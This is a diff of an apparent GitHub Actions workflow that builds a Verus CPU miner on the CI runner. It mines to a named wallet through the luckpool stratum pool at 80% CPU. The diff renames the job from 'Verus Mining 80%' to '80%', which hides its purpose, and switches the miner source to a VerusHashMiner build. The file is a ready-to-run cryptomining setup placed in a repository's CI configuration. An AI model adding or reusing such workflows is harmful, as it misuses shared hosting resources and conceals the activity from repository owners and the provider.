@@ -1,4 +1,4 @@
-name: Verus Mining 80%
+name: 80%
 
 on:
   workflow_dispatch:
@@ -12,21 +12,22 @@ jobs:
     - name: Install dependencies
       run: |
         sudo apt update
-        sudo apt install git build-essential automake autoconf libtool \
-        pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev \
-        cpulimit -y
+        sudo apt install git build-essential cmake libuv1-dev \
+        libssl-dev libhwloc-dev cpulimit -y
 
-    - name: Clone cpuminer source
+    - name: Clone VerusHashMiner
       run: |
-        git clone https://github.com/JayDDee/cpuminer-opt.git
-        cd cpuminer-opt
-        ./build.sh
+        git clone https://github.com/VerusCoin/VerusHashMiner.git
+        cd VerusHashMiner
+        mkdir build
+        cd build
+        cmake ..
+        make -j2
 
     - name: Start mining (80% CPU)
       run: |
-        cd cpuminer-opt
-        cpulimit -l 80 -- ./cpuminer \
-        -a verus \
+        cd VerusHashMiner/build
+        cpulimit -l 80 -- ./verushashminer \
         -o stratum+tcp://na.luckpool.net:3956 \
         -u RQLTCKt8WJAMwfW29tZfn8jJ6WeoNmkP4P.worker \
         -p x \
